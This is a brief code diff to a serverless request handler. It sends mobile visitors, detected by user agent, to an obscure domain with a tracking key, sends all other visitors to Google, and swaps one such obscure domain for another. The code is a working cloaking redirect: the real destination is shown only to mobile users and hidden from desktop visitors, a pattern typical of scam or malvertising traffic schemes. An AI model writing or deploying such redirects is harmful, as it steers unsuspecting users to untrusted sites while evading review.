@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://valuationappeared.com/jstr1j45k?key=c17fe28d4b634b684d3d37a167ba6e5d", 302);
+    return Response.redirect("https://encumbercomplication.com/jstr1j45k?key=c17fe28d4b634b684d3d37a167ba6e5d", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
